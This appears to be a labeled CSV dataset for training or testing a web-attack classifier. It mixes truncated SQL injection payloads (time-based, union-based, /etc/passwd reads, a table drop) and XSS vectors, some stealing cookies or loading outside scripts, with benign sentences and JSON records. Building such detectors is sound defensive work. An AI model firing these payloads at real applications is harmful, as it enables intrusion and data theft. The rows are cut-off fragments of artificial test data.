Payload,Label,text_label,ID
"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( ",2,SQLi,19264
"<style>@keyframes x{}</style><meta style=""animatio",1,XSS,8363
"{""id"":null,""firstName"":""Muthamil Selvi"",""lastName""",0,normal,26956
"1"" ) ) ) or 7427 = dbms_pipe.receive_message ( chr",2,SQLi,13907
<video src=1 onerror=alert(1)>,1,XSS,1145
<input3 onpointerdown=alert(1)>XSS</input3>,1,XSS,8489
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)",1,XSS,552
-8409 ) ) as ipbz where 9984 = 9984 or 3371 = 3869,2,SQLi,14037
"1%"" union all select null,null,null,null,null,null",2,SQLi,20946
<tbody onpointerdown=alert(1)>XSS</tbody>,1,XSS,8593
"{""id"":null,""firstName"":""Tao"",""lastName"":""Ming"",""ad",0,normal,26902
"<style>@keyframes x{}</style><col style=""animation",1,XSS,2805
"&lt;SCRIPT&gt;document&#46;write(\""&lt;SCRI\"");&lt",1,XSS,1048
"<svg><a xlink:href=""javascript:alert(1)""><text x=""",1,XSS,150
"<q draggable=""true"" ondragend=""alert(1)"">test</q>",1,XSS,3071
"<s draggable=""true"" ondragend=""alert(1)"">test</s>",1,XSS,8687
<audio controls autoplay onratechange=alert(1)><so,1,XSS,95
<command id=x tabindex=1 onbeforedeactivate=alert(,1,XSS,7628
1 ) ) ) or 2367 = ( select count ( * ) from rdb$fi,2,SQLi,16992
"1%"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ",2,SQLi,13557
"<div/onmouseover='alert(1)'> style=""x:"">",1,XSS,915
><script+src=https://suggest-shop.yahooapis.jp/Sho,1,XSS,9796
"select * from users where id = 1 or ""1,"" or 1 = 1 ",2,SQLi,11843
1' where 7613 = 7613,2,SQLi,19440
1' ) ) as dqby where 9256 = 9256,2,SQLi,15624
1,0,normal,26648
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascri",1,XSS,1498
"Available in Playback Mode, the D-Lighting functio",0,normal,26337
select * from users where id = 1 + \+%1 union sele,2,SQLi,11626
"-2734' ) union all select 5510,5510,5510,5510,5510",2,SQLi,14244
"<noframes onbeforecopy=""alert(1)"" contenteditable>",1,XSS,4888
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10636
The age of a child will greatly affect which gift ,0,normal,25486
<style>:target {color:red;}</style><html id=x styl,1,XSS,7101
1' ) and 9254 = ( select count ( * ) from rdb$fiel,2,SQLi,17700
"<tfoot oncopy=""alert(1)"" contenteditable>test</tfo",1,XSS,7876
"{""id"":null,""name"":""main""}",0,normal,27511
1' ) ) or 7552 = ( select count ( * ) from rdb$fie,2,SQLi,14525
Select tutor.,0,normal,24718
"1"" ) ) as xhat where 6674 = 6674 union all select ",2,SQLi,17258
"1%"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""%""",2,SQLi,19592
1 ) ) and ( 3020 = 3020 ) *6703 and ( ( 3078 = 307,2,SQLi,19109
"1"" ) ) or 7427 = dbms_pipe.receive_message ( chr (",2,SQLi,13390
"-8454"" or 6872 = 6872",2,SQLi,21442
"union select 1,load_file('/etc/passwd'),1,1,1;",2,SQLi,10124
<ruby onpointerover=alert(1)>XSS</ruby>,1,XSS,4904
1'|| ( select 'boib' where 9595 = 9595,2,SQLi,15266
1 ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ,2,SQLi,16848
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,13630
<script onerror=alert(1) src=/></script>,1,XSS,5148
select * from users where id = 1 + @<@# union sele,2,SQLi,11926
<q onpointerup=alert(1)>XSS</q>,1,XSS,7287
<slot onpointerup=alert(1)>XSS</slot>,1,XSS,5571
"<dfn onmouseenter=""alert(1)"">test</dfn>",1,XSS,1969
1'|| ( select 'gopc' where 7386 = 7386 and make_se,2,SQLi,21498
feed:javascript:alert('Top Page Location: '+docume,1,XSS,9379
"-1447"" union all select 3013,3013,3013,3013,3013,3",2,SQLi,19535
"{""id"":null,""firstName"":""Miki"",""lastName"":""Jiang"",""",0,normal,27468
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&,1,XSS,1636
1' ) ) as yyja where 4321 = 4321 or 8315 = ( selec,2,SQLi,17972
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,7405
1' ) where 3767 = 3767 and 6240 = ( 'qqpjq'|| ( se,2,SQLi,22035
1' ) and 6510 = ( select count ( * ) from sysusers,2,SQLi,18265
><script+src=https://api.userlike.com/api/chat/slo,1,XSS,9812
"Identify, select and demonstrate understanding of ",0,normal,26060
1,0,normal,26727
"<dialog onmousedown=""alert(1)"">test</dialog>",1,XSS,3039
<button onTrackChange=javascript:alert(1)>,1,XSS,9674
"<video><source onerror=""javascript:javascript:aler",1,XSS,623
<sup onpointerup=alert(1)>XSS</sup>,1,XSS,6249
<IMG SRC=âjavascript:alert(âXSSâ);â>,1,XSS,927
><img src=x onerror=alert('XSS');>,1,XSS,9693
Delete the extra spaces.,0,normal,22565
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,17385
"-7083"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr (",2,SQLi,12971
"1"" ) union all select null,null,null--",2,SQLi,21703
The sliders won't let you select anything shorter ,0,normal,25373
-8369 ) where 7234 = 7234 order by 1--,2,SQLi,18510
Where's the motel?,0,normal,23547
}</style><script>a=eval;b=alert;a(b(/XSS/.source)),1,XSS,1334
"<maction actiontype=""statusline"" xlink:href=""javas",1,XSS,9227
"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",1,XSS,5152
select,0,normal,26621
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10525
"<style>@keyframes x{}</style><time style=""animatio",1,XSS,2690
; alert(1);,1,XSS,1716
select sleep ( 5 ) and ( ( 'uyft' = 'uyft,2,SQLi,20388
The Select Transactions of this society were colle,0,normal,25349
"<rt onbeforepaste=""alert(1)"" contenteditable>test<",1,XSS,2061
"-4318"" ) as vpvt where 5543 = 5543 union all selec",2,SQLi,16955
"<isindex onmouseenter=""alert(1)"">test</isindex>",1,XSS,6040
<aside id=x tabindex=1 ondeactivate=alert(1)></asi,1,XSS,8526
"<thead onmouseenter=""alert(1)"">test</thead>",1,XSS,3858
"1"" where 9083 = 9083 and ( select 2* ( if ( ( sele",2,SQLi,14756
"<xmp onmousedown=""alert(1)"">test</xmp>",1,XSS,8125
<b id=x tabindex=1 onfocusin=alert(1)></b>,1,XSS,7521
1'|| ( select 'tzxr' from dual where 2934 = 2934 a,2,SQLi,17471
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20",2,SQLi,10910
1 ) as caoa where 6139 = 6139 union all select nul,2,SQLi,18919
or 3=3,2,SQLi,10083
<shadow id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,8511
"1%"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""%"" ",2,SQLi,19049
<svg><em onload=alert(1)></em>,1,XSS,7583
"1"" and 4386 = utl_inaddr.get_host_address ( chr ( ",2,SQLi,14656
"1' ) where 6489 = 6489 or updatexml ( 1808,concat ",2,SQLi,19634
1 ) as uuro where 6784 = 6784,2,SQLi,18730
"<li onmousemove=""alert(1)"">test</li>",1,XSS,7848
1%' order by 1--,2,SQLi,18865
declare @q nvarchar ( 200 ) 0x730065006c00650063 .,2,SQLi,11851
Demonstrate the ability to select relevant princip,0,normal,26243
"<dl onmouseover=""alert(1)"">test</dl>",1,XSS,2820
1' union all select null#,2,SQLi,14227
"<script>alert(""XSS"");</script>&search=1",1,XSS,951
"<slot onmouseenter=""alert(1)"">test</slot>",1,XSS,5365
#ERROR!,2,SQLi,22525
1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ),2,SQLi,18747
"1' ) where 6328 = 6328 union all select null,null,",2,SQLi,20758
"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( ra",2,SQLi,12621
Select reboot.,0,normal,24628
1' ) rlike ( select ( case when ( 2671 = 4485 ) th,2,SQLi,21670
"1' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",2,SQLi,22118
<rtc onpointerup=alert(1)>XSS</rtc>,1,XSS,6388
1 where 6369 = 6369 procedure analyse ( extractval,2,SQLi,16482
"<;/TITLE>;<;SCRIPT>;alert(""XSS"");<;/SCRIPT>;",1,XSS,1641
"<shadow onmouseleave=""alert(1)"">test</shadow>",1,XSS,5203
1'|| ( select 'ocmk' from dual where 3961 = 3961 o,2,SQLi,16193
"select * from generate_series ( 7536,7536,case whe",2,SQLi,15345
<base onpointerdown=alert(1)>XSS</base>,1,XSS,6454
"1' procedure analyse ( extractvalue ( 9255,concat ",2,SQLi,17731
1' where 9241 = 9241 or 4915 = ( select count ( * ,2,SQLi,16847
1' and 6510 = ( select count ( * ) from sysusers a,2,SQLi,19178
"{""id"":null,""firstName"":""Hu"",""lastName"":""Jiakang"",""",0,normal,27248
from,0,normal,26513
"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162",2,SQLi,14529
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,18915
"<bgsound onbeforepaste=""alert(1)"" contenteditable>",1,XSS,7319
<hr onpointerout=alert(1)>XSS</hr>,1,XSS,1967
"end and ( ""nuix"" like ""nuix",2,SQLi,13498
Select a book for your reading pleasure.,0,normal,24006
"{""id"":null,""name"":""needed stretch""}",0,normal,27221
"1%"" or 4240 = ( select 4240 from pg_sleep ( 5 ) ) ",2,SQLi,19192
"<i onmouseup=""alert(1)"">test</i>",1,XSS,2027
"-6733' ) where 4024 = 4024 union all select 4024,4",2,SQLi,14829
"-4984%"" ) ) ) union all select 6980,6980,6980,6980",2,SQLi,12182
"{""id"":null,""firstName"":""Mike"",""lastName"":""Bane"",""a",0,normal,27597
1'+ ( select qugu where 2287 = 2287 order by 1#,2,SQLi,15996
<svg><small onload=alert(1)></small>,1,XSS,4966
<output id=x tabindex=1 onbeforedeactivate=alert(1,1,XSS,4130
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-",2,SQLi,10576
where,0,normal,26525
<content onpointerup=alert(1)>XSS</content>,1,XSS,7684
Save up to 35% off select on Select Polywood Patio,0,normal,25714
"<blink onmouseover=""alert(1)"">test</blink>",1,XSS,2930
She'll select soon.,0,normal,24428
<iframe onblur=alert(1) id=x><input autofocus>,1,XSS,1792
"<source onmouseleave=""alert(1)"">test</source>",1,XSS,6957
The feature will launch in select countries later ,0,normal,25450
1 ) as vqdh where 1603 = 1603,2,SQLi,15842
1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'rozr' like ',2,SQLi,13725
"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a7",2,SQLi,14781
<noframes onfocusout=alert(1) tabindex=1 id=x></no,1,XSS,7029
"1"" and 8514 = ( select count ( * ) from domain.dom",2,SQLi,13919
<ruby id=x tabindex=1 onbeforeactivate=alert(1)></,1,XSS,6710
"1"" ) where 9621 = 9621",2,SQLi,16998
1 where 6036 = 6036 and 7533 = 7533--,2,SQLi,14035
"<;IMG DYNSRC="";javascript:alert(';XSS';);"";>;",1,XSS,1595
1 or 4411 = ( select count ( * ) from sysusers as ,2,SQLi,14643
<basefont id=x tabindex=1 onbeforeactivate=alert(1,1,XSS,4386
"<main onclick=""alert(1)"">test</main>",1,XSS,7530
"<div style=""font-family:foo}color=red;"">XXX",1,XSS,701
1' ) or 5286 = ( select count ( * ) from all_users,2,SQLi,20611
"-4291"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( c",2,SQLi,12114
"-4901' union all select 1536,1536,1536,1536,1536,1",2,SQLi,15958
"1"" ) as wvxt where 7321 = 7321 and 8312 = dbms_pip",2,SQLi,16740
select * from users where id = '1' or ||/1 = 1 uni,2,SQLi,11380
"<tr onmouseover=""alert(1)"">test</tr>",1,XSS,4032
"-2725"" union all select 3671,3671,3671,3671,3671#",2,SQLi,19119
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10617
"<STYLE TYPE=""text/javascript"">javascript:alert(1);",1,XSS,765
1'|| ( select 'hafu' where 6226 = 6226,2,SQLi,16250
"1 ) ) union all select null,null,null,null,null,nu",2,SQLi,16878
"<style>@keyframes x{}</style><script style=""animat",1,XSS,4345
"<IFRAME SRC=""javascript:javascript:alert(1);""></IF",1,XSS,759
1 ) ) as quap where 7625 = 7625,2,SQLi,13023
"<select onkeypress=""alert(1)"" contenteditable>test",1,XSS,6601
) waitfor delay '0:0:20' --,2,SQLi,10926
"{""id"":null,""firstName"":""Jimmy"",""lastName"":""Lim"",""s",0,normal,27611
"1"" and 4241 = convert ( int, ( select char ( 113 )",2,SQLi,20886
"<xss id=x style=""transition:outline 1s"" ontransiti",1,XSS,39
<style>:target {color: red;}</style><font id=x sty,1,XSS,3616
<button onReadyStateChange=javascript:alert(1)>,1,XSS,9650
"-9526 where 5734 = 5734 or elt ( 1032 = 1032,3623 ",2,SQLi,18973
1' where 9583 = 9583 and 5319 = 7670#,2,SQLi,16457
"<center draggable=""true"" ondragstart=""alert(1)"">te",1,XSS,5277
-9217 or 9323 = 9323#,2,SQLi,15653
"<tfoot oncontextmenu=""alert(1)"">test</tfoot>",1,XSS,7206
<img src/onerror=alert(1)>,1,XSS,2896
<del onfocusout=alert(1) tabindex=1 id=x></del><in,1,XSS,5049
1%' or 5356 = ( select count ( * ) from sysusers a,2,SQLi,18110
"<em onmouseleave=""alert(1)"">test</em>",1,XSS,4590
-3125' ) ) ) order by 1#,2,SQLi,14728
"1' ) ) ) union all select null,null,null--",2,SQLi,16370
"1%"" waitfor delay '0:0:5' and ""%"" = """,2,SQLi,15262
<sCriPt/src=//14.rs?,1,XSS,9248
-7430' ) as xfah where 1596 = 1596 or 4144 = ( sel,2,SQLi,14559
-6327' ) ) union all select 2685--,2,SQLi,19410
"1"" ) as assu where 7521 = 7521 or 5356 = ( select ",2,SQLi,13418
"<bdi onclick=""alert(1)"">test</bdi>",1,XSS,8701
"{""id"":null,""name"":""Charizard""}",0,normal,27195
"-3834' ) ) ) union all select 8313,8313--",2,SQLi,15373
"<embed onmousemove=""alert(1)"">test</embed>",1,XSS,7575
"<meta onmousemove=""alert(1)"">test</meta>",1,XSS,6304
"1%"" or 2367 = ( select count ( * ) from rdb$fields",2,SQLi,20833
1 ) where 6304 = 6304,2,SQLi,21180
"<strong draggable=""true"" ondragenter=""alert(1)"">te",1,XSS,2809
1'+ ( select 'wyed' where 9896 = 9896,2,SQLi,21017
"1 ) ) ) union all select null,null,null,null--",2,SQLi,21082
1' and ( select 2* ( if ( ( select * from ( select,2,SQLi,12284
"<command oncopy=""alert(1)"" contenteditable>test</c",1,XSS,8499
Where can I select a movie for our movie night?,0,normal,23870
"1"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97",2,SQLi,12406
"-1043"" ) where 4207 = 4207 or 2724 in ( ( char ( 1",2,SQLi,22240
"<handler xmlns:ev=""http://www.w3.org/2001/xml-even",1,XSS,9181
Click the photo or photos you want to download to ,0,normal,26276
It's not clear how Twitter plans to select its tes,0,normal,25939
1'+ ( select jrmz where 4762 = 4762 and elt ( 9588,2,SQLi,21020
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&,1,XSS,253
"<style>@keyframes x{}</style><html style=""animatio",1,XSS,6863
"<hgroup onkeypress=""alert(1)"" contenteditable>test",1,XSS,5085
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1",1,XSS,512
"-4135' ) ) ) union all select 4413,4413,4413#",2,SQLi,21337
-1949 ) as smyn where 4066 = 4066 union all select,2,SQLi,14755
"-6249' ) ) ) union all select 5136,5136,5136,5136,",2,SQLi,16837
1'+ ( select 'qbdh' where 4006 = 4006 and 7533 = 7,2,SQLi,17478
"<style>@keyframes slidein {}</style><ruby style=""a",1,XSS,3336
Select your hope.,0,normal,24937
"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a474",2,SQLi,13154
<sub onpointerout=alert(1)>XSS</sub>,1,XSS,8408
"select * from generate_series ( 1431,1431,case whe",2,SQLi,20561
"{""id"":null,""firstName"":""Ben"",""lastName"":""Chia"",""sp",0,normal,26854
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img ",1,XSS,9063
"<LAYER SRC=""%(scriptlet)s""></LAYER>",1,XSS,751
1' ) ) and 3754 = ( select upper ( xmltype ( chr (,2,SQLi,14162
"-6000"" ) where 1797 = 1797 union all select 1797,1",2,SQLi,16587
"<script draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,2350
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>,1,XSS,6077
"-8409%' ) or make_set ( 9354 = 9354,7185 ) and ( '",2,SQLi,16105
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,8937
1,0,normal,26710
-9007 ) as gill where 6462 = 6462 union all select,2,SQLi,20200
""") or benchmark(10000000,MD5(1))#",2,SQLi,10845
1' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ,2,SQLi,21737
"1"" ) where 6367 = 6367 union all select null,null,",2,SQLi,17170
"1 where 6412 = 6412 union all select null,null,nul",2,SQLi,16957
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",1,XSS,6943
Select fork.,0,normal,24529
1%' and 3707 = ( select count ( * ) from sysibm.sy,2,SQLi,21399
1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr,2,SQLi,12852
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;,1,XSS,1467
1'|| ( select 'zqwd' where 1647 = 1647 rlike sleep,2,SQLi,18515
"-6170 ) ) ) or 1 group by concat ( 0x7171706a71, (",2,SQLi,13085
Dumplin' arrives in select theaters and on Netflix,0,normal,26224
"<kbd onmousedown=""alert(1)"">test</kbd>",1,XSS,2392
Select a program to watch on TV.,0,normal,24047
1 ) ) as msug where 3503 = 3503 and sleep ( 5 ) #,2,SQLi,13586
1' ) where 8274 = 8274,2,SQLi,21138
Where's your SQL aid?,0,normal,23411
"<sub onmouseout=""alert(1)"">test</sub>",1,XSS,8576
Select a scent for your room.,0,normal,24243
"<u onkeydown=""alert(1)"" contenteditable>test</u>",1,XSS,5300
1 where 6881 = 6881 procedure analyse ( extractval,2,SQLi,14725
"1 where 1842 = 1842 or 8514 = benchmark ( 5000000,",2,SQLi,18436
"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( ran",2,SQLi,18180
"1"" ) ) and 6510 = ( select count ( * ) from sysuse",2,SQLi,15145
"<img \x00src=x onerror=""javascript:alert(1)"">",1,XSS,663
1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105,2,SQLi,12285
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,6820
Select acquire.,0,normal,24559
"<thead onbeforepaste=""alert(1)"" contenteditable>te",1,XSS,3470
1 ) ) as muyz where 6105 = 6105,2,SQLi,12370
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""f",1,XSS,528
",drop table temp --",2,SQLi,11761
select pg_sleep ( 5 ) and 'rpka' = 'rpka,2,SQLi,13983
<del onpointerup=alert(1)>XSS</del>,1,XSS,5471
<form><input formaction=javascript:alert(1) type=s,1,XSS,9179
"<ruby onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,8634
"<svg><path><animateMotion onbegin=alert(1) dur=""1s",1,XSS,8797
"<picture draggable=""true"" ondragend=""alert(1)"">tes",1,XSS,3784
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) )",2,SQLi,12824
"<a href=""javas\x07cript:javascript:alert(1)"" id=""f",1,XSS,430
"1"" ) as qjyu where 2679 = 2679 and 6414 = ( select",2,SQLi,14461
"<noscript onkeyup=""alert(1)"" contenteditable>test<",1,XSS,7683
"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5",2,SQLi,12692
1 ) where 4653 = 4653 or 6793 = ( select 6793 from,2,SQLi,20140
1' ) ) ) or 5286 = ( select count ( * ) from all_u,2,SQLi,17442
<pre id=x tabindex=1 onfocusin=alert(1)></pre>,1,XSS,4884
1 ) ) as pjkd where 1105 = 1105 and 4386 = utl_ina,2,SQLi,18876
"<dfn draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,5146
) waitfor delay '0:0:20' /*,2,SQLi,22491
"{""id"":null,""name"":""Azumarill""}",0,normal,26981
"<IMG SRC=x onpause=""alert(String.fromCharCode(88,8",1,XSS,1228
"-1272' or 1 group by concat ( 0x7171706a71, ( sele",2,SQLi,18052
"-2394' ) union all select 1650,1650,1650,1650,1650",2,SQLi,12959
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,15406
"![a'""`onerror=prompt(document.cookie)](x)\",1,XSS,9416
Select the best course for your education.,0,normal,24106
select * from users where id = '1' <@&1 union sele,2,SQLi,11651
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077,1,XSS,904
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><in,1,XSS,7591
"<address onmouseup=""alert(1)"">test</address>",1,XSS,8326
1' ) where 8586 = 8586 and 3202 = like ( 'abcdefg',2,SQLi,20360
"<dd onmouseleave=""alert(1)"">test</dd>",1,XSS,2495
<audio autoplay controls onpause=alert(1)><source ,1,XSS,86
Save up to 30% off select Simple Modern water bott,0,normal,25717
<style>:target {color:red;}</style><strong id=x st,1,XSS,2993
"-5606 ) union all select 7118,7118,7118,7118,7118,",2,SQLi,19295
"<menu onmouseup=""alert(1)"">test</menu>",1,XSS,2260
Why would a supernatural force use a videotape to ,0,normal,25121
"<div ondblclick=""alert(1)"">test</div>",1,XSS,3081
"1' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",2,SQLi,14807
"<audio onkeypress=""alert(1)"" contenteditable>test<",1,XSS,6392
1 ) as wiyx where 6515 = 6515,2,SQLi,16376
<button onResizeEnd=javascript:alert(1)>,1,XSS,9655
"<header onmouseleave=""alert(1)"">test</header>",1,XSS,3018
1 ) ) as rroe where 4840 = 4840,2,SQLi,20349
1 ) ) ) or sleep ( 5 ) and ( ( ( 2209 = 2209,2,SQLi,20185
"1"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""tuhy"" li",2,SQLi,21712
select ( case when ( 4774 = 1535 ) then 4774 else ,2,SQLi,15497
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microso",1,XSS,4991
"<;IMG SRC="";javascript:alert(';XSS';)"";",1,XSS,1655
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4365
ÃÆÃÂ½ or 1 = 1 --,2,SQLi,11617
"<div style=""behaviour: url([link to code]);"">",1,XSS,1534
"1' ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4",2,SQLi,13870
<svg onload=alert(1)//,1,XSS,9452
-8047' or 3038 = 3038,2,SQLi,20650
1 ) where 5465 = 5465 or 8315 = ( select count ( *,2,SQLi,14933
eval('\x61lert(1)'),1,XSS,9401
onclick=prompt(8)>@x.y,1,XSS,344
"<template onmouseenter=""alert(1)"">test</template>",1,XSS,8465
"1' union all select null,null,null,null,null,null,",2,SQLi,20722
<main onpointerout=alert(1)>XSS</main>,1,XSS,8194
"<x 1=1""onxxx=1",1,XSS,9681
1'+ ( select dyfw where 7743 = 7743 and 8407 = ( s,2,SQLi,13151
"-9152"" ) ) as avga where 3825 = 3825 order by 1#",2,SQLi,18322
<style>:target {transform: rotate(180deg);}</style,1,XSS,1984
"1%"" ) or 8421 = ( select count ( * ) from generate",2,SQLi,19478
Identify columns where applicable.,0,normal,23291
"<em onkeydown=""alert(1)"" contenteditable>test</em>",1,XSS,3688
"<basefont onkeydown=""alert(1)"" contenteditable>tes",1,XSS,8362
1 where 3354 = 3354,2,SQLi,12582
1%' ) ) ) and 8312 = dbms_pipe.receive_message ( c,2,SQLi,12901
)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) A,2,SQLi,11205
"On Android devices, open the Play Store, click the",0,normal,25850
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6929
"{""id"":null,""name"":""KingEtemon""}",0,normal,27165
"1%' ) ) ) union all select null,null,null,null,nul",2,SQLi,19725
